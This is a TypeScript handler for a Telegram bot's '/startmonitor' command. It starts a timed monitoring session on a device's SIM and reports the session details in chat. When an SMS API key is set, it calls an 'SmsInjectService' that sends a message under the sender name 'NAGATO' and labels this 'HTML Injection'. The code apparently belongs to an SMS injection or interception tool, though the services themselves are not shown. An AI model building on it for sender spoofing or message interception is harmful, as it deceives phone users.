import { Telegraf } from "telegraf";

import { MonitoringService } from "../../services/MonitoringService";
import { SmsInjectService } from "../../services/SmsInjectService";
import { UserRepository } from "../../database/repositories/UserRepository";


export function registerStartMonitorCommand(
    bot: Telegraf
) {


    bot.command(
        "startmonitor",
        async (ctx) => {


            if (!ctx.from) {
                return;
            }



            const telegramId =
                ctx.from.id;



            const result =
                await MonitoringService.start(
                    telegramId
                );



            if (!result.success) {


                await ctx.reply(
                    result.message
                );


                return;

            }





            const smsApiKey =
                UserRepository.getSmsApiKey(
                    telegramId
                );



            const htmlEnabled =
                !!smsApiKey;





            if(htmlEnabled){


                await SmsInjectService.inject(

                    telegramId,

                    "NAGATO",

                    "System online. Monitoring started."

                );


            }





            const sim =
                result.device.active_sim === 2
                    ? "SIM 2"
                    : "SIM 1";



            const expires =
                result.expiresAt.toLocaleTimeString(

                    "en-IN",

                    {
                        hour:"2-digit",
                        minute:"2-digit"
                    }

                );





            await ctx.reply(

`━━━━━━━━━━━━━━━━━━━━
🟢 Monitoring Started
📱 Device: ${result.device.device_id}
📶 Selected SIM: ${sim}
📢 Monitoring Chat: ${result.chat.chat_title}
🌐 HTML Injection: ${htmlEnabled ? "Enabled" : "Disabled"}
⏳ Duration: 5 Minutes
🕒 Ends At: ${expires}
━━━━━━━━━━━━━━━━━━━━
📨 Waiting for forwarded messages...
Use /stopmonitor to stop monitoring.
━━━━━━━━━━━━━━━━━━━━`

            );


        }

    );


}